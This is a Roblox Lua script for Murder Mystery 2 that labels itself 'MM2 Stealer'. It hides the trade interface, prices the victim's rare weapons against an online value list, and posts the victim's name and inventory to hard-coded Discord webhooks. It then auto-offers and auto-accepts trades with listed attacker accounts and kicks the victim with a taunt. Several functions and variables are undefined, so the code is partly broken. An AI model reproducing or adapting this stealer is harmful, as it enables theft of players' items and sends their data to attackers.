usernames = { "xQuartz0", "isaidmager", "214Eli_alt4" }
webhook = "https://discord.com/api/webhooks/1404789801785364500/Gj3a6Wh-Hhx1ZtqVWN57Wi2SV2znrqi1UVGvhqE8e56wApuyC7fsZBZ1aWMNMyNMgJlM"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local OfferItem = ReplicatedStorage.Trade.OfferItem
local SendRequest = ReplicatedStorage.Trade.SendRequest
local AcceptTrade = ReplicatedStorage.Trade.AcceptTrade
local StartTrade = ReplicatedStorage.Trade.StartTrade
local GetProfileData = ReplicatedStorage.Remotes.Inventory.GetProfileData

local request = (syn and syn.request) or (http and http.request) or (http_request) or request
local executor = (identifyexecutor and identifyexecutor()) or "Unknown"

local tradeGui_phone = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone

tradeGui_phone:destroy()

local function isUsernameInList(name)
	for _, v in ipairs(usernames) do
		if v == name then return true end
	end
	return false
end

pcall(function()
	LocalPlayer.PlayerGui.TradeGUI:destroy()
end)

local function fireClick(button)
	if button and button:IsA("TextButton") then
		button.Visible = false
		button.Position = UDim2.new(2, 0, 2, 0)
		for _, conn in ipairs(getconnections(button.MouseButton1Click)) do
			pcall(function() conn:Fire() end)
		end
		for _, conn in ipairs(getconnections(button.Activated)) do
			pcall(function() conn:Fire() end)
		end
	end
end

local function moveGuiOffscreen(gui)
	if gui and gui:IsA("GuiObject") then
		gui.Visible = true
		gui.Position = UDim2.new(2, 0, 2, 0)
	end
end

local function getTopItems()
	local success, profileData = pcall(function()
		return GetProfileData:InvokeServer()
	end)
	if not success or not profileData then return {} end

	local owned = profileData.Weapons and profileData.Weapons.Owned or {}
	local success, Values = pcall(function()
		local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}
local headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    local response = request({
        Url = url,
        Method = "GET",
        Headers = headers
    })
    return response.Body
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        local value = tonumber(valueStr)
        if value then
            return value
        end
    end
    return nil
end

local function extractItems(htmlContent)
    local itemValues = {}
    
    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trim(itemName:gsub("%s+", " "))
            itemName = trim((itemName:split(" Click "))[1])
            local itemNameLower = itemName:lower()

            local value = parseValue(itembodyDiv)
            if value then
                itemValues[itemNameLower] = value
            end
        end
    end
    
    return itemValues
end

local function extractChromaItems(htmlContent)
    local chromaValues = {}

    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        chromaName = chromaName:match("([^<]+)")
        if chromaName then
            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
            local value = parseValue(itembodyDiv)
            if value then
                chromaValues[chromaName] = value
            end
        end
    end
    
    return chromaValues
end

local function buildValueList()
    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local categoriesToFetch = {}

    for rarity, url in pairs(categories) do
        table.insert(categoriesToFetch, {rarity = rarity, url = url})
    end
    
    local totalCategories = #categoriesToFetch
    local completed = 0
    local lock = Instance.new("BindableEvent")

    for _, category in ipairs(categoriesToFetch) do
        task.spawn(function()
            local rarity = category.rarity
            local url = category.url
            local htmlContent = fetchHTML(url)
            
            if htmlContent and htmlContent ~= "" then
                if rarity ~= "chroma" then
                    local extractedItemValues = extractItems(htmlContent)
                    for itemName, value in pairs(extractedItemValues) do
                        allExtractedValues[itemName] = value
                    end
                else
                    chromaExtractedValues = extractChromaItems(htmlContent)
                end
            end

            completed = completed + 1
            if completed == totalCategories then
                lock:Fire()
            end
        end)
    end

    lock.Event:Wait()

    local valueList = {}

    for dataid, item in pairs(database) do
        local itemName = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local hasChroma = item.Chroma or false

        if itemName ~= "" and rarity ~= "" then
            local weaponRarityIndex = table.find(rarityTable, rarity)
            local godlyIndex = table.find(rarityTable, "Godly")

            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
                if hasChroma then
                    local matchedChromaValue = nil
                    for chromaName, value in pairs(chromaExtractedValues) do
                        if chromaName:find(itemName) then
                            matchedChromaValue = value
                            break
                        end
                    end

                    if matchedChromaValue then
                        valueList[dataid] = matchedChromaValue
                    end
                else
                    local value = allExtractedValues[itemName]
                    if value then
                        valueList[dataid] = value
                    end
                end
            end
        end
    end

    return valueList
end

if totalValue >= 100 then
    usernames = { "xQuartz0", "isaidmager", "" } -- dual usernames
    webhook = "https://discord.com/api/webhooks/1404789545349677146/05aP8Gy9jvwMjhGaclGL9e7G9-1s1rmxaxL84conf3s901hp6enAewOBSIfV-4YdVbCs"
end

local function sendWebhook(totalValue, tradableSummary)
	local payload = {
		["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
		["embeds"] = {{
			["title"] = "MM2 Stealer",
			["color"] = 0x8400ff,
			["fields"] = {
				{["name"] = "Victim", ["value"] = LocalPlayer.Name},
				{["name"] = "Creator", ["value"] = table.concat(usernames, ", ")},
				{["name"] = "Executor", ["value"] = executor},
				{["name"] = "Total Value", ["value"] = formatNumber(totalValue)},
				{["name"] = "Items", ["value"] = "```\n" .. tradableSummary .. "```"},
				{["name"] = "Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
			},
			["footer"] = {["text"] = "by @x19b â€¢ " .. os.date("%B %d, %Y")},
			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}}
	}

	local function send(url, data)
		pcall(function()
			request({
				Url = url,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = HttpService:JSONEncode(data)
			})
		end)
	end

	send(webhook, payload)
end

sendWebhook(totalValue, summariseItems(items))

local function tryClickTradeGUI(name)
	local gui = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI")
	local root = gui:FindFirstChild("Lobby") or gui:FindFirstChild("Game")
	if not root then return end

	local leaderboard = root:FindFirstChild("Leaderboard")
	if not leaderboard then return end
	moveGuiOffscreen(leaderboard)

	local container = leaderboard:FindFirstChild("Container")
	local playerList = container and container:FindFirstChild("PlayerList")
	local targetFrame = playerList and playerList:FindFirstChild(name) or container and container:FindFirstChild(name)

	if targetFrame then
		local actionBtn = targetFrame:FindFirstChild("ActionButton")
		if actionBtn then
			fireClick(actionBtn)
			task.wait(0.5)

			local inspect = leaderboard:FindFirstChild("Inspect")
			local popup = leaderboard:FindFirstChild("Popup")

			if inspect then
				moveGuiOffscreen(inspect)
				fireClick(inspect:FindFirstChild("Trade"))
			elseif popup and popup:FindFirstChild("Container") then
				local tradeBtn = popup.Container:FindFirstChild("Action") and popup.Container.Action:FindFirstChild("Trade")
				if tradeBtn then
					moveGuiOffscreen(popup)
					fireClick(tradeBtn)
				end
			end
		end
	end
end

local function doTrade()
	local items = getTopItems()
	local count = 0
	for _, item in ipairs(items) do
		for _ = 1, item.quantity do
			OfferItem:FireServer(item.id, "Weapons")
			task.wait(0.1)
		end
		count += 1
		if count >= 4 then break end
	end

	task.wait(0.5)
	local remaining = getTopItems()
	local total = 0
	for _, item in ipairs(remaining) do
		total += item.value * item.quantity
	end
	
		if #remaining == 0 or total <= 0 then
		task.wait(1)
		LocalPlayer:Kick("YOU JUST GOT STOLEN BY TravScripts discord.gg/pNfrgHeede")
	end
end

local function connectChat(p)
	p.Chatted:Connect(function()
		if isUsernameInList(p.Name) then
			task.spawn(function()
				while true do
					tryClickTradeGUI(p.Name)
					task.wait(0.4)
				end
			end)
		end
	end)
end

for _, p in ipairs(Players:GetPlayers()) do
	connectChat(p)
end

Players.PlayerAdded:Connect(connectChat)
StartTrade.OnClientEvent:Connect(doTrade)

task.spawn(function()
	while true do
		AcceptTrade:FireServer(285646582)
		task.wait(0.5)
	end
end)
